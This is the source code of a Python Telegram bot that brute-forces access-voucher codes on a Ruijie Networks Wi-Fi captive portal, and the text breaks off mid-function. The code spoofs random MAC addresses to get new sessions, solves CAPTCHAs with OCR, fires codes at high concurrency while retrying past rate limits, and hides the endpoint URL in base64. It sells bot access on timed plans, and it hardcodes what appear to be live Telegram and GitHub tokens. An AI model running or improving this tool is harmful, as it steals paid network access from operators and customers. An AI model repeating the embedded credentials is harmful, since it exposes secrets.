import telebot
import asyncio
import aiohttp
import json
import base64
import random
import re
import os
import string
import time
import uuid
import cv2
import ddddocr
import numpy as np
from datetime import datetime, timedelta, timezone
from telebot.async_telebot import AsyncTeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiohttp import web

# ----------------- Configurations -----------------
BOT_TOKEN = '8545879694:AAHrZvFatoCxQl0NqBiuUEYHUTtCDuB9FZw'
GITHUB_TOKEN = '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'
ADMIN_ID = "6658845504"
REPO_OWNER = "phyoe001pp-design"
REPO_NAME = "ID-Bot"

# ----------------- Global Systems -----------------
SUCCESS_CODE = asyncio.Queue()
bot = AsyncTeleBot(BOT_TOKEN)
user_data = {}  # Active users sessions memory

scan_tasks = {}
success_messages = {}
success_texts = {}
limited_messages = {}
limited_texts = {}
captcha_state = {}
retry_counts = {}

session = None
_connector = None
CONCURRENCY = 170
_voucher_sem = None
_start_time = time.monotonic()
_ocr = ddddocr.DdddOcr(show_ad=False)

# ----------------- Access Control System -----------------
async def is_allowed(user_id):
    """အသုံးပြုသူသည် Admin ဖြစ်ပါက သို့မဟုတ် auth_list ထဲတွင် သက်တမ်းရှိပါက ခွင့်ပြုမည်"""
    if str(user_id) == ADMIN_ID:
        return True, "Admin", "Unlimited"
    try:
        auth_list, _ = await get_file_content("auth_list.json")
        if str(user_id) not in auth_list:
            return False, None, None
        
        user_info = auth_list[str(user_id)]
        expiration_time = user_info.get("expires_at", "")
        plan = user_info.get("plan", "Standard")
        
        if expiration_time == "9999-12-31T23:59:59Z":
            return True, plan, "Unlimited"
            
        expire_dt = datetime.fromisoformat(expiration_time.replace("Z", "+00:00"))
        now = datetime.now(timezone.utc)
        
        if expire_dt > now:
            diff = expire_dt - now
            days = diff.days
            hours, rem = divmod(diff.seconds, 3600)
            minutes = rem // 60
            return True, plan, f"{days}d {hours}h {minutes}m"
        else:
            return False, None, None
    except Exception as e:
        print(f"[is_allowed] Error: {e}")
        return False, None, None

async def handle(request):
    return web.Response(text="Bot is awake and running 24/7!")
async def web_server():
    app = web.Application()
    app.router.add_get('/', handle)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get('PORT', 8099))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    print(f"Web server started on port {port}")

async def get_file_content(path):
    url = f"https://github.com{REPO_OWNER}/{REPO_NAME}/contents/{path}"
    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
    async with session.get(url, headers=headers) as response:
        if response.status == 200:
            data = await response.json()
            content = base64.b64decode(data['content']).decode('utf-8')
            return json.loads(content), data['sha']
    return {}, None

async def update_file_content(path, content, sha, message):
    url = f"https://github.com{REPO_OWNER}/{REPO_NAME}/contents/{path}"
    headers = {
        "Authorization": f"token {GITHUB_TOKEN}",
        "Content-Type": "application/json"
    }
    encoded = base64.b64encode(json.dumps(content).encode()).decode()
    payload = {
        "message": message,
        "content": encoded,
        "sha": sha
    }
    async with session.put(url, headers=headers, json=payload) as response:
        return await response.text()


def main_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("🔑 /key", callback_data="menu_key"),
        InlineKeyboardButton("📥 /input", callback_data="menu_input"),
        InlineKeyboardButton("🔍 /scan", callback_data="menu_scan"),
        InlineKeyboardButton("🔄 /recheck", callback_data="menu_recheck"),
        InlineKeyboardButton("📋 /result", callback_data="menu_result"),
        InlineKeyboardButton("⏹ /stop", callback_data="menu_stop"),
        InlineKeyboardButton("📊 /status", callback_data="menu_status"),
        InlineKeyboardButton("❓ Help", callback_data="menu_help")
    )
    return markup

def scan_mode_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("6-digit", callback_data="scan_6"),
        InlineKeyboardButton("7-digit", callback_data="scan_7"),
        InlineKeyboardButton("8-digit", callback_data="scan_8"),
        InlineKeyboardButton("ascii-lower", callback_data="scan_ascii"),
        InlineKeyboardButton("all (a-z0-9)", callback_data="scan_all"),
        InlineKeyboardButton("🔙 Back", callback_data="menu_back")
    )
    return markup
@bot.message_handler(commands=['start'])
async def start(message):
    allowed, plan, time_left = await is_allowed(message.chat.id)
    if not allowed:
        await bot.reply_to(message, "❌ သင့်တွင် Bot သုံးစွဲခွင့် မရှိပါ။ Admin ထံ ဆက်သွယ်ပါ။")
        return

    await bot.reply_to(
        message,
        f"🤖 Ruijie Voucher Bot\n"
        f"━━━━━━━━━━━━━━━\n"
        f"👤 Account Level: {plan}\n"
        f"⏳ ကျန်ရှိသက်တမ်း: {time_left}\n\n"
        f"အောက်ပါ Menu မှ လိုအပ်သော command ကို ရွေးချယ်ပါ။",
        reply_markup=main_menu()
    )

@bot.message_handler(commands=['menu'])
async def menu_command(message):
    allowed, plan, time_left = await is_allowed(message.chat.id)
    if not allowed:
        await bot.reply_to(message, "❌ သင့်တွင် Bot သုံးစွဲခွင့် မရှိပါ။")
        return
        
    await bot.reply_to(
        message,
        f"📋 Main Menu\n━━━━━━━━━━━━━━━\n"
        f"👤 Level: {plan} | ⏳ Time: {time_left}",
        reply_markup=main_menu()
    )

@bot.callback_query_handler(func=lambda call: True)
async def callback_handler(call):
    chat_id = call.message.chat.id
    msg_id = call.message.message_id
    
    allowed, plan, time_left = await is_allowed(chat_id)
    if not allowed:
        await bot.answer_callback_query(call.id, "❌ သင့်အကောင့် သက်တမ်းကုန်ဆုံးသွားပါပြီ။", show_alert=True)
        return

    if call.data == "menu_back":
        await bot.edit_message_text(f"📋 Main Menu\n━━━━━━━━━━━━━━━\n👤 Level: {plan} | ⏳ Time: {time_left}", chat_id=chat_id, message_id=msg_id, reply_markup=main_menu())
        await call.answer()
        return

    if call.data == "menu_key":
        await bot.edit_message_text("🔑 /key - Key အတည်ပြုရန် (အလိုအလျောက် approved)", chat_id=chat_id, message_id=msg_id, reply_markup=main_menu())
        await handle_key(call.message)
        await call.answer()
        return

    if call.data == "menu_input":
        await bot.edit_message_text("📥 /input - Session URL ထည့်သွင်းရန်\n\nUsage: /input your_session_url", chat_id=chat_id, message_id=msg_id, reply_markup=main_menu())
        await call.answer()
        return

    if call.data == "menu_scan":
        await bot.edit_message_text("🔍 Scan Mode ရွေးချယ်ပါ:", chat_id=chat_id, message_id=msg_id, reply_markup=scan_mode_menu())
        await call.answer()
        return

    if call.data.startswith("scan_"):
        mode_map = {"scan_6": "6", "scan_7": "7", "scan_8": "8", "scan_ascii": "ascii-lower", "scan_all": "all"}
        mode = mode_map.get(call.data, "6")
        await bot.edit_message_text(f"🔍 Scan စတင်နေပါသည်... Mode: {mode}", chat_id=chat_id, message_id=msg_id, reply_markup=main_menu())
        
        class FakeMessage:
            def __init__(self, c_id):
                self.chat = type('obj', (object,), {'id': c_id})()
        
        fake_msg = FakeMessage(chat_id)
        if chat_id not in user_data:
            user_data[chat_id] = {}
        user_data[chat_id]['scan_mode'] = mode
        await scan(fake_msg, mode)
        await call.answer()
        return

    if call.data == "menu_recheck":
        await bot.edit_message_text("🔄 /recheck - Success Code များကို ပြန်လည်စစ်ဆေးရန်", chat_id=chat_id, message_id=msg_id, reply_markup=main_menu())
        await recheck(call.message)
        await call.answer()
        return

    if call.data == "menu_result":
        await bot.edit_message_text("📋 /result - ရရှိထားသော Success Code များကိုကြည့်ရန်", chat_id=chat_id, message_id=msg_id, reply_markup=main_menu())
        await handle_result(call.message)
        await call.answer()
        return

    if call.data == "menu_stop":
        await bot.edit_message_text("⏹ /stop - လက်ရှိ scan ကိုရပ်တန့်ရန်", chat_id=chat_id, message_id=msg_id, reply_markup=main_menu())
        await stop_scan(call.message)
        await call.answer()
        return

    if call.data == "menu_status":
        await bot.edit_message_text("📊 /status - Bot အခြေအနေကြည့်ရန် (Admin only)", chat_id=chat_id, message_id=msg_id, reply_markup=main_menu())
        await status(call.message)
        await call.answer()
        return

    if call.data == "menu_help":
        help_text = (
            "🤖 Ruijie Voucher Bot - Help\n\n"
            "Commands:\n"
            "/start - Bot ကိုစတင်ရန်\n"
            "/menu - Menu ပြသရန်\n"
            "/key - Key အတည်ပြုရန်\n"
            "/input <url> - Session URL ထည့်ရန်\n"
            "/scan <mode> - Scan စတင်ရန်\n"
            "/recheck - Success Codes ပြန်စစ်ရန်\n"
            "/result - Success Codes ကြည့်ရန်\n"
            "/stop - Scan ရပ်တန့်ရန်"
        )
        await bot.edit_message_text(help_text, chat_id=chat_id, message_id=msg_id, reply_markup=main_menu())
        await call.answer()
        return
@bot.message_handler(commands=['key'])
async def handle_key(message):
    user_data[message.chat.id] = {}
    await bot.reply_to(message, "✅ Key အတည်ပြုပြီးပါပြီ။\n/input ဖြင့် Session URL ထည့်ပါ။", reply_markup=main_menu())

@bot.message_handler(commands=['listkeys'])
async def listkeys(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission")
        return
    try:
        auth_list, _ = await get_file_content("auth_list.json")
        if not auth_list:
            await bot.reply_to(message, "Registered user မရှိသေးပါ။")
            return
        lines = []
        for uid, data in auth_list.items():
            if isinstance(data, dict):
                expires = data.get("expires_at", "unknown")
                plan = data.get("plan", "unknown")
                if expires == "9999-12-31T23:59:59Z":
                    expires_str = "Unlimited"
                else:
                    try:
                        exp_dt = datetime.fromisoformat(expires.replace("Z", "+00:00"))
                        now = datetime.now(timezone.utc)
                        if exp_dt < now:
                            expires_str = "❌ Expired"
                        else:
                            diff = exp_dt - now
                            expires_str = f"⏳ {diff.days}d {diff.seconds//3600}h left"
                    except:
                        expires_str = expires
            else:
                plan = "Legacy"
                expires_str = str(data)
            lines.append(f"👤 User: `{uid}`\n   ✨ Plan: {plan}\n   📅 Status: {expires_str}")
            
        text = f"📋 Registered Keys ({len(auth_list)})\n\n" + "\n\n".join(lines)
        if len(text) > 4096:
            for i in range(0, len(text), 4096):
                await bot.send_message(message.chat.id, text[i:i+4096])
        else:
            await bot.reply_to(message, text)
    except Exception as e:
        print(f"Error at listkeys {e}")

def generate_expiry(plan):
    now = datetime.now(timezone.utc)
    plans = {
        "30m": timedelta(minutes=30), "1h": timedelta(hours=1),
        "1d": timedelta(days=1), "7d": timedelta(days=7),
        "1m": timedelta(days=30), "1y": timedelta(days=365),
        "unlimited": None
    }
    if plan not in plans:
        return None
    if plan == "unlimited":
        return "9999-12-31T23:59:59Z"
    return (now + plans[plan]).isoformat()

@bot.message_handler(commands=['genkey'])
async def genkey(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission")
        return
    try:
        args = message.text.split()
        if len(args) < 3:
            await bot.reply_to(message, "Usage:\n/genkey <plan> <user_id>\n\nPlans: 30m, 1h, 1d, 7d, 1m, 1y, unlimited")
            return
        plan = args[1]
        user_id = args[2]
        expiry = generate_expiry(plan)
        if not expiry:
            await bot.reply_to(message, "❌ Plan မှားယွင်းနေပါသည်။ ရွေးချယ်နိုင်သော ပုံစံများ:\n30m, 1h, 1d, 7d, 1m, 1y, unlimited")
            return
            
        auth_list, sha = await get_file_content("auth_list.json")
        auth_list[user_id] = {"expires_at": expiry, "plan": plan}
        await update_file_content("auth_list.json", auth_list, sha, f"Add/Update member {user_id}")
        
        await bot.reply_to(message, f"✅ Key Generated/Updated Successfully!\n\n👤 USER ID : `{user_id}`\n✨ VIP PLAN : {plan.upper()}\n📅 EXPIRES : {expiry}")
        try:
            await bot.send_message(int(user_id), f"🎉 သင့်အကောင့်ကို Admin မှ သက်တမ်းတိုးပေးလိုက်ပါပြီ!\n✨ VIP Level: {plan.upper()}\n📅 သက်တမ်းကုန်ဆုံးရက်: {expiry}\n/start ကိုနှိပ်၍ ပြန်လည်သုံးစွဲနိုင်ပါပြီ။")
        except:
            pass
    except Exception as e:
        print(f"Error at genkey {e}")

@bot.message_handler(commands=['delkey'])
async def delkey(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission")
        return
    try:
        args = message.text.split()
        if len(args) < 2:
            await bot.reply_to(message, "Usage:\n/delkey <user_id>")
            return
        user_id = args[1]
        auth_list, sha = await get_file_content("auth_list.json")
        if user_id not in auth_list:
            await bot.reply_to(message, f"User ID {user_id} မတွေ့ပါ။")
            return
        del auth_list[user_id]
        await update_file_content("auth_list.json", auth_list, sha, f"Delete user {user_id}")
        user_data.pop(int(user_id), None)
        await bot.reply_to(message, f"✅ User Access Revoked!\n\nUSER ID : `{user_id}`")
    except Exception as e:
        print(f"Error at delkey {e}")
@bot.message_handler(commands=['input'])
async def handle_input(message):
    chat_id = message.chat.id
    allowed, _, _ = await is_allowed(chat_id)
    if not allowed:
        await bot.reply_to(message, "❌ သင့်တွင် Bot သုံးစွဲခွင့် မရှိပါ။")
        return

    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "Usage:\n/input your_session_url")
        return
    url = args[1]
    if chat_id not in user_data:
        user_data[chat_id] = {}
        
    await bot.reply_to(message, "⏳ Session URL အား အတည်ပြုချက် စစ်ဆေးနေပါသည်။")
    if await check_session_url(url):
        user_data[chat_id]['session_url'] = url
        await bot.reply_to(message, "✅ Session URL မှန်ကန်ပြီး သိမ်းဆည်းပြီးပါပြီ။\n/scan ဖြင့် စတင်ဖတ်နိုင်ပါပြီ။", reply_markup=main_menu())
    else:
        await bot.reply_to(message, "❌ Session URL သက်တမ်းကုန်နေခြင်း သို့မဟုတ် မှားယွင်းနေပါသည်။", reply_markup=main_menu())

@bot.message_handler(commands=['scan'])
async def scan(message, mode=None):
    chat_id = message.chat.id
    allowed, _, _ = await is_allowed(chat_id)
    if not allowed:
        await bot.reply_to(message, "❌ သင့်တွင် Bot သုံးစွဲခွင့် မရှိပါ။")
        return

    if mode is None:
        args = message.text.split(maxsplit=1)
        if len(args) < 2:
            await bot.reply_to(message, "Usage:\n/scan <6|7|8|ascii-lower|all>\n\nသို့မဟုတ် Menu မှရွေးချယ်ပါ။", reply_markup=scan_mode_menu())
            return
        mode = args[1]

    if chat_id not in user_data or 'session_url' not in user_data[chat_id]:
        await bot.reply_to(message, "⚠️ /scan မပြုလုပ်မီ /input ဖြင့် Session URL ကို အရင်ထည့်သွင်းပေးပါ။", reply_markup=main_menu())
        return

    if chat_id in scan_tasks and not scan_tasks[chat_id]["task"].done():
        await bot.reply_to(message, "⚠️ Scan သည် ယခုအချိန်တွင် အလုပ်လုပ်နေပါသည်။ ရပ်လိုပါက /stop ဟု ရိုက်ပါ။", reply_markup=main_menu())
        return

    progress_msg = await bot.send_message(chat_id, "🔍 Scanning Codes...", reply_markup=main_menu())
    scan_id = str(uuid.uuid4())
    task = asyncio.create_task(run_bruteforce(mode, chat_id, user_data[chat_id]['session_url'], scan_id, message=message, progress_msg=progress_msg))
    scan_tasks[chat_id] = {"task": task, "stop": False, "scan_id": scan_id}

@bot.message_handler(commands=['result'])
async def handle_result(message):
    results, _ = await get_file_content("result.json")
    chat_id_str = str(message.chat.id)
    if chat_id_str in results and results[chat_id_str]:
        codes = "\n".join(results[chat_id_str])
        await bot.reply_to(message, f"✅ Found Codes:\n{codes}", reply_markup=main_menu())
    else:
        await bot.reply_to(message, "သင့်ထံတွင် သိမ်းဆည်းထားသော အောင်မြင်သည့် Code များမရှိသေးပါ။", reply_markup=main_menu())

@bot.message_handler(commands=['recheck'])
async def recheck(message):
    chat_id = message.chat.id
    if chat_id not in user_data or "session_url" not in user_data[chat_id]:
        await bot.reply_to(message, "⚠️ /recheck မပြုလုပ်မီ /input ဖြင့် URL အရင်ထည့်ပါ။", reply_markup=main_menu())
        return
        
    results, sha = await get_file_content("result.json")
    chat_id_str = str(chat_id)
    if chat_id_str in results and results[chat_id_str]:
        codes = results[chat_id_str]
        await bot.reply_to(message, f"🔄 Success Code များအား ဆာဗာတွင် ပြန်လည်စစ်ဆေးနေပါသည်...")
        session_url_recheck = user_data[chat_id]["session_url"]
        recheck_list = []
        for code in codes:
            recode = await perform_check(session_url_recheck, code, chat_id, scan_id=None, recheck=True, message=message)
            if recode:
                recheck_list.append(recode)
        to_show = "\n".join(recheck_list) if recheck_list else "ယခုအခါ မည်သည့် Code မျှ အသုံးမပြုနိုင်တော့ပါ။"
        await bot.reply_to(message, f"✅ Rechecked Codes:\n\n{to_show}", reply_markup=main_menu())
        await save_rechecked_codes(chat_id_str, recheck_list, sha)
    else:
        await bot.reply_to(message, "သင့်တွင် success code တစ်ခုမျှမရှိသေးပါ။", reply_markup=main_menu())

@bot.message_handler(commands=['status'])
async def status(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission", reply_markup=main_menu())
        return
    active_scans = sum(1 for data in scan_tasks.values() if not data["task"].done())
    uptime_seconds = int(time.monotonic() - _start_time)
    hours, remainder = divmod(uptime_seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    await bot.reply_to(
        message,
        f"📊 Bot Engine Status\n\n"
        f"⏱ Uptime: {hours}h {minutes}m {seconds}s\n"
        f"🔍 Active Scans: {active_scans}\n"
        f"👥 Total Active Cached Users: {len(user_data)}",
        reply_markup=main_menu()
    )

@bot.message_handler(commands=['stop'])
async def stop_scan(message):
    chat_id = message.chat.id
    data = scan_tasks.get(chat_id)
    if data and not data["task"].done():
        data["stop"] = True
        data["scan_id"] = None
        data["task"].cancel()
        cleanup_user_states(chat_id)
        await bot.reply_to(message, "⏹ Scanning လုပ်ဆောင်မှုကို အောင်မြင်စွာ ရပ်တန့်လိုက်ပါပြီ။", reply_markup=main_menu())
    else:
        await bot.reply_to(message, "⚠️ လက်ရှိတွင် ရပ်တန့်ရန် မည်သည့် Scan Task မျှ မရှိပါ။", reply_markup=main_menu())

def cleanup_user_states(chat_id):
    success_messages.pop(chat_id, None)
    success_texts.pop(chat_id, None)
    limited_messages.pop(chat_id, None)
    limited_texts.pop(chat_id, None)
    retry_counts.pop(chat_id, None)
async def save_rechecked_codes(chat_id_str, recheck_list, sha):
    results, _ = await get_file_content("result.json")
    results[chat_id_str] = recheck_list
    await update_file_content("result.json", results, sha, f"Update after recheck for {chat_id_str}")

async def github_update_scheduler():
    global SUCCESS_CODE
    while True:
        await asyncio.sleep(80)
        items = []
        while not SUCCESS_CODE.empty():
            items.append(await SUCCESS_CODE.get())
        if items:
            try:
                results, sha = await get_file_content("result.json")
                for item in items:
                    chat_id = str(item["chat_id"])
                    code = item["code"]
                    if chat_id not in results:
                        results[chat_id] = []
                    if code not in results[chat_id]:
                        results[chat_id].append(code)
                await update_file_content("result.json", results, sha, "Periodic Update")
            except Exception as e:
                print(f"Update Error: {e}")

def digit_generator(length):
    return "".join(random.choice(string.digits) for _ in range(length))

def all_generator(length=6):
    strings = string.ascii_lowercase + string.digits
    return "".join(random.choice(strings) for _ in range(length))

def ascii_generator(length=6):
    return "".join(random.choice(string.ascii_lowercase) for _ in range(length))

def iter_codes(mode):
    if mode in ["6", "7"]:
        length = int(mode)
        codes = [str(i).zfill(length) for i in range(10 ** length)]
        random.shuffle(codes)
        yield from codes
        return
    if mode == "8":
        while True: yield digit_generator(8)
    if mode == "ascii-lower":
        while True: yield ascii_generator(6)
    if mode == "all":
        while True: yield all_generator(6)
    raise ValueError(f"Unsupported scan mode: {mode}")

def format_progress(checked, total=None, speed=0, found=0, retries=0, time_left=""):
    speed_str = f"{speed:,.0f} codes/min"
    base = f"🔍 Scanning Codes...\n\n⏳ User Expiry: {time_left}\n📦 Checked : {checked:,}"
    if total is not None:
        percent = (checked / total) * 100
        bar = "█" * min(20, int(percent / 5)) + "░" * (20 - min(20, int(percent / 5)))
        return base + f"/{total:,}\n📊 Progress : {percent:.2f}%\n⚡ Speed : {speed_str}\n✅ Found : {found}\n🔁 Retry : {retries}\n[{bar}]"
    return base + f"\n⚡ Speed : {speed_str}\n✅ Found : {found}\n🔁 Retry : {retries}\n📊 Status : running\n"

BATCH_SIZE = 2000

async def run_bruteforce(mode, chat_id, session_url, scan_id, message=None, progress_msg=None):
    try:
        code_iter = iter_codes(mode)
    except ValueError as e:
        await bot.send_message(chat_id, str(e))
        return
    total = 10 ** int(mode) if mode in ["6", "7"] else None
    checked = 0
    scan_start = time.monotonic()
    global _voucher_sem
    if _voucher_sem is None:
        _voucher_sem = asyncio.Semaphore(CONCURRENCY)

    try:
        while True:
            current_task = scan_tasks.get(chat_id)
            if not current_task or current_task.get("scan_id") != scan_id:
                return
            if current_task.get("stop"):
                scan_tasks.pop(chat_id, None)
                success_messages.pop(chat_id, None)
                success_texts.pop(chat_id, None)
                return

            batch = []
            for _ in range(BATCH_SIZE):
                try:
                    batch.append(next(code_iter))
                except StopIteration:
                    break
            if not batch:
                break

            async def _check(code):
                async with _voucher_sem:
                    return await perform_check(
                        session_url, code, chat_id, scan_id, message=message
                    )

            await asyncio.gather(*[_check(code) for code in batch], return_exceptions=True)

            checked += len(batch)

            elapsed = time.monotonic() - scan_start
            speed = (checked / elapsed * 60) if elapsed > 0 else 0
            found = len(success_texts.get(chat_id, []))
            retries = retry_counts.get(chat_id, 0)
            text = format_progress(checked, total, speed, found, retries)
            try:
                await bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=progress_msg.message_id,
                    text=text,
                    reply_markup=main_menu()
                )
            except Exception:
                try:
                    new_msg = await bot.send_message(chat_id, text, reply_markup=main_menu())
                    progress_msg.message_id = new_msg.message_id
                except Exception as err:
                    print(f"Progress Message Error: {err}")

        if progress_msg:
            final_found = len(success_texts.get(chat_id, []))
            final_retries = retry_counts.get(chat_id, 0)
            finish_text = (
                "✅ Scanning Completed\n\n"
                f"📦Checked : {checked:,}\n"
                f"✅Found : {final_found}\n"
                f"🔁Retry : {final_retries}\n"
                "📊Progress : 100%\n"
                "[████████████████████]"
            )
            try:
                await bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=progress_msg.message_id,
                    text=finish_text,
                    reply_markup=main_menu()
                )
            except:
                try:
                    await bot.send_message(chat_id, finish_text, reply_markup=main_menu())
                except Exception as err:
                    print(f"Progress Finish Message Error: {err}")
        scan_tasks.pop(chat_id, None)
        success_messages.pop(chat_id, None)
        success_texts.pop(chat_id, None)
        limited_messages.pop(chat_id, None)
        limited_texts.pop(chat_id, None)
        retry_counts.pop(chat_id, None)
    finally:
        scan_tasks.pop(chat_id, None)
        success_messages.pop(chat_id, None)
        success_texts.pop(chat_id, None)
        limited_messages.pop(chat_id, None)
        limited_texts.pop(chat_id, None)
        retry_counts.pop(chat_id, None)

def get_mac():
    first_byte = random.choice([0x02, 0x06, 0x0A, 0x0E])
    mac = [first_byte] + [random.randint(0x00, 0xff) for _ in range(5)]
    return ':'.join(f'{x:02x}' for x in mac)

async def get_session_id(session, session_url, previous_session_id=None):
    mac = get_mac()
    session_url = replace_mac(session_url, new_mac=mac)
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'priority': 'u=0, i',
        'referer': session_url,
        'sec-ch-ua': '"Chromium";v="148", "Microsoft Edge";v="148", "Not/A)Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0',
        'cookie': 'sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E8%87%AA%E7%84%B6%E6%90%9C%E7%B4%A2%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC%22%2C%22%24latest_referrer%22%3A%22https%3A%2F%://google.com%2F%22%7D%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMTllMGRkYmQ5ZjIxNTItMGRmOTQxZjJlZmM2YjA4LTRjNjU3YjU4LTEzMjcxMDQtMTllMGRkYmQ5ZjNhNjAifQ%3D%3D%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%22%2C%22value%22%3A%22%22%7D%2C%22%24device_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%7D'
    }
    try:
        async with session.get(session_url, headers=headers, allow_redirects=True) as req:
            response = str(req.url)
            session_id = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response)
            if session_id:
                return session_id.group(1)
            else:
                return previous_session_id
    except:
        print("Session ID Fetch Error")
        return previous_session_id

def replace_mac(url, new_mac):
    url = re.sub(r'(?<=mac=)[^&]+', new_mac, url)
    return url

async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False, message=None):
    global _connector

    if not recheck:
        current_task = scan_tasks.get(chat_id)
        if not current_task or current_task.get("scan_id") != scan_id:
            return

    post_url = base64.b64decode(
        b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM='
    ).decode()

    response_text = None
    session_id = None

    for attempt in range(3):
        timeout = aiohttp.ClientTimeout(total=30)

        async with aiohttp.ClientSession(
            connector=_connector,
            connector_owner=False,
            cookie_jar=aiohttp.CookieJar(),
            timeout=timeout
        ) as task_session:

            session_id = await get_session_id(task_session, session_url, None)
            if not session_id:
                return

            auth_code = None

            for _ in range(8):
                try:
                    image = await Captcha_Image(task_session, session_id)
                    text = await Captcha_Text(image)

                    if not text:
                        continue

                    if await Varify_Captcha(task_session, session_id, text):
                        auth_code = text
                        break

                except Exception as e:
                    print(f"[perform_check] captcha error: {e}")

            if not auth_code:
                return

            if not recheck:
                current_task = scan_tasks.get(chat_id)
                if not current_task or current_task.get("scan_id") != scan_id or current_task.get("stop"):
                    return

            data = {
                "accessCode": code,
                "sessionId": session_id,
                "apiVersion": 1,
                "authCode": auth_code,
            }

            headers = {
                "authority": "portal-as.ruijienetworks.com",
                "accept": "*/*",
                "content-type": "application/json",
                "origin": "https://ruijienetworks.com",
                "referer": f"https://ruijienetworks.com/...sessionId={session_id}",
                "user-agent": "Mozilla/5.0",
            }

            try:
                async with task_session.post(post_url, json=data, headers=headers) as req:
                    response_text = await req.text()

                    try:
                        resp_json = json.loads(response_text)
                    except:
                        resp_json = {}

                    print(f"[voucher] code={code} attempt={attempt+1} status={req.status} resp={resp_json}")

            except Exception as e:
                print(f"[perform_check] request error: {e}")
                return

        # retry handling
        if response_text and "request limited" in response_text:
            retry_counts[chat_id] = retry_counts.get(chat_id, 0) + 1
            continue

        break

    if not response_text:
        return

    # ================= SUCCESS =================
    if "logonUrl" in response_text:

        if recheck:
            return code

        success_texts.setdefault(chat_id, [])
        expire_date = await Code_Expires_Date(session_id)

        success_texts[chat_id].append(f"🎫 {code}\n   {expire_date}")

        await SUCCESS_CODE.put({
            "chat_id": chat_id,
            "code": code
        })

        if message:
            code_line = "\n\n".join(success_texts[chat_id])

            try:
                if chat_id not in success_messages:
                    sent = await bot.send_message(
                        chat_id=message.chat.id,
                        text=f"✅ Success Codes:\n\n{code_line}",
                        reply_markup=main_menu()
                    )
                    success_messages[chat_id] = sent.message_id
                else:
                    await bot.edit_message_text(
                        chat_id=message.chat.id,
                        message_id=success_messages[chat_id],
                        text=f"✅ Success Codes:\n\n{code_line}",
                        reply_markup=main_menu()
                    )
            except Exception as e:
                print(f"Success Message Error: {e}")

    # ================= LIMITED =================
    elif "STA" in response_text:

        limited_texts.setdefault(chat_id, [])
        expire_date = await Code_Expires_Date(session_id)

        limited_texts[chat_id].append(f"⚠️ {code}\n   {expire_date}")

        if message:
            limited_line = "\n\n".join(limited_texts[chat_id])

            try:
                if chat_id not in limited_messages:
                    sent = await bot.send_message(
                        chat_id=message.chat.id,
                        text=f"⚠️ Limited Codes:\n\n{limited_line}",
                        reply_markup=main_menu()
                    )
                    limited_messages[chat_id] = sent.message_id
                else:
                    await bot.edit_message_text(
                        chat_id=message.chat.id,
                        message_id=limited_messages[chat_id],
                        text=f"⚠️ Limited Codes:\n\n{limited_line}",
                        reply_markup=main_menu()
                    )
            except Exception as e:
                print(f"Limited Message Error: {e}")

def Minute_to_Hour(total_minutes):
    if total_minutes == 'Unknown':
        return 'Unknown'
    try:
        hours = int(total_minutes) // 60
        minutes = int(total_minutes) % 60
        if hours > 0 and minutes > 0:
            return f"{hours}h {minutes}m"
        elif hours > 0:
            return f"{hours}h"
        else:
            return f"{minutes}m"
    except:
        return 'Unknown'

async def Code_Expires_Date(session_id):
    headers = {
        'authority': '://ruijienetworks.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'content-type': 'application/json;',
        'referer': 'https://://ruijienetworks.com/download/static/maccauth/src/balance.html?RES=./../expand/res/4ukmferxbdgmt3m49po&sessionId=04ecdc104a99406194f594057b21fd21&lang=en_US&redirectUrl=https://www.ruijienetwoacom&authTypeype=15',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    try:
        timeout = aiohttp.ClientTimeout(total=15)
        async with aiohttp.ClientSession(
            connector=_connector,
